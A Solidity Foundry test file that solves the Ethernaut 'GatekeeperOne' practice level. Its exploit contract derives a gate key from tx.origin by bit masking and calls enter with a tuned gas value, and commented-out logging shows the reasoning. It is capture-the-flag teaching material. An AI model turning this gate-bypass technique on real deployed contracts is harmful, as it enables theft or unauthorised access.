// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import "forge-std/console2.sol";

import {Ethernaut} from "../game/Ethernaut.sol";
import {GatekeeperOne} from "../levels/GatekeeperOne/GatekeeperOne.sol";
import {GatekeeperOneFactory} from "../levels/GatekeeperOne/GatekeeperOneFactory.sol";
import {LevelTest} from "./common/LevelTest.sol";

contract GatekeeperOneTest is LevelTest {
    GatekeeperOne private level;

    constructor() {
        levelFactory = new GatekeeperOneFactory();
    }

    function testGatekeeperOne() public {
        run();
    }

    function init() internal override {
        levelAddress = payable(this.create());
        level = GatekeeperOne(levelAddress);
    }

    function exploit() internal override {
        vm.startPrank(player, player);
        new GatekeeperOneExploit(level).run();
        vm.stopPrank();
    }
}

contract GatekeeperOneExploit {
    GatekeeperOne private immutable level;

    constructor(GatekeeperOne _level) {
        level = _level;
    }

    function run() public {
        // console2.log(tx.origin);

        bytes8 tail = bytes8(uint64(uint16(uint160(tx.origin))));
        bytes8 head = bytes2(0xffff);
        bytes8 key = bytes8(head | tail);

        // uint32 a1 = uint32(uint64(key));
        // uint16 a2 = uint16(uint64(key));
        // uint64 a3 = uint64(key);

        // console2.log("key", uint64(key));

        // console2.log("uint32(uint64(key))", a1);
        // console2.log("uint16(uint64(key))", uint32(a2)); // implicit cast uint16 -> uint32
        // console2.log(a1 == uint32(a2));

        // console2.log("uint32(uint64(key))", uint64(a1)); // implicit cast uint32 -> uint64
        // console2.log("uint64(key)", uint64(key));
        // console2.log(uint64(a1) != uint64(key));

        // uint32 b1 = uint32(uint64(key));
        // uint16 b2 = uint16(uint160(tx.origin));

        // console2.log("uint32(uint64(key)))", b1);
        // console2.log("uint16(uint160(tx.origin))", uint32(b2)); // implicit cast uint16 -> uint32
        // console2.log(b1 == uint32(b2));

        level.enter{gas: 3420 + 8191*100}(key);
    }
}
